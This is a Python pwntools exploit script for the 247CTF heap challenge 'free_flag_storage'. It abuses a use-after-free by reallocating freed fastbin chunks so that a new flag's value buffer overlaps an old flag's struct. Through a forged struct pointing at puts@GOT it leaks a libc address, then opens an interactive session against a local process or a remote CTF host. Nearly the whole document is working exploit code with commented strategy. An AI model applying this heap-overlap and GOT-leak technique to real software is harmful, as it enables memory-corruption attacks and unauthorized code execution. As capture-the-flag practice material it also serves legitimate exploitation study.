#!/usr/bin/env python3
"""
UAF Exploit v2 for free_flag_storage - 247CTF
Using different allocation sizes to create struct<->value overlap

Key insight:
- Struct is always 16 bytes (24-byte chunk in 32-bit glibc)
- Value of 8 bytes -> 16-byte chunk (different fastbin!)
- Value of 16 bytes -> 24-byte chunk (same fastbin as struct!)

Strategy:
1. Create flags with 8-byte values (struct in fastbin-24, value in fastbin-16)
2. Delete all flags
3. Create new flag with 16-byte value
   - struct comes from fastbin-24 (reuses old struct)
   - value ALSO from fastbin-24 (reuses ANOTHER old struct!)
4. Now one flag's value buffer IS another flag's struct location!
"""
from pwn import *

context.binary = elf = ELF('./free_flag_storage')
context.log_level = 'info'

# GOT addresses
puts_got = 0x804b028
atoi_got = 0x804b034

def start():
    if args.REMOTE:
        return remote('de22d451a7a11cba.247ctf.com', 50413)
    if args.GDB:
        return gdb.debug('./free_flag_storage', '''
            set pagination off
            c
        ''')
    return process('./free_flag_storage')

p = start()

def send3(s):
    p.send(str(s).encode().ljust(3, b'\n'))

def add(length, value, cid, score):
    p.sendline(b'add')
    p.recvuntil(b'length:'); send3(length)
    p.recvuntil(b'value:'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def edit(idx, value, length, cid=99, score=99):
    p.sendline(b'edit')
    p.recvuntil(b'edit:'); send3(idx)
    p.recvuntil(b'):'); p.send(value.ljust(length, b'\x00')[:length])
    p.recvuntil(b'challenge_id:'); send3(cid)
    p.recvuntil(b'score:'); send3(score)
    p.recvuntil(b'Enter command:')

def delete(idx):
    p.sendline(b'delete')
    p.recvuntil(b'delete:'); send3(idx)
    p.recvuntil(b'Enter command:')

def show():
    p.sendline(b'print')
    return p.recvuntil(b'Enter command:', drop=True)

# Initial prompt
p.recvuntil(b'Enter command:')

log.info("=== Step 1: Create 3 flags with 8-byte values ===")
add(8, b'AAAAAAAA', 1, 11)  # flag0: struct0(24b chunk), value0(16b chunk)
add(8, b'BBBBBBBB', 2, 22)  # flag1: struct1(24b chunk), value1(16b chunk)
add(8, b'CCCCCCCC', 3, 33)  # flag2: struct2(24b chunk), value2(16b chunk)

log.info("Initial state:")
log.info(show().decode())

log.info("=== Step 2: Delete flag2, flag1, flag0 (LIFO order) ===")
delete(2)  # fastbin-24: struct2, fastbin-16: value2
delete(1)  # fastbin-24: struct1->struct2, fastbin-16: value1->value2
delete(0)  # fastbin-24: struct0->struct1->struct2, fastbin-16: value0->value1->value2

log.info("=== Step 3: Add new flag with 16-byte value ===")
log.info("Struct(24b) comes from fastbin: struct0")
log.info("Value(24b) also from fastbin: struct1 !")

# Create fake struct: [length=16][value_ptr=puts@got][cid][score]
fake_struct = p32(16) + p32(puts_got) + p32(0xdead) + p32(0xbeef)
add(16, fake_struct, 4, 44)  # flag0 new: struct=struct0, value=struct1!

log.info("=== Step 4: Show - flag1 should read our fake struct ===")
data = show()
log.info(f"Output:\n{data}")

# Parse output - look for leaked address
if b'\xf7' in data or b'\x7f' in data:
    log.success("Possible libc leak detected!")
    # Try to extract it
    for line in data.split(b'\n'):
        if b'Flag' in line and (b'\xf7' in line or b'value:' in line):
            log.info(f"Interesting line: {line}")

p.interactive()
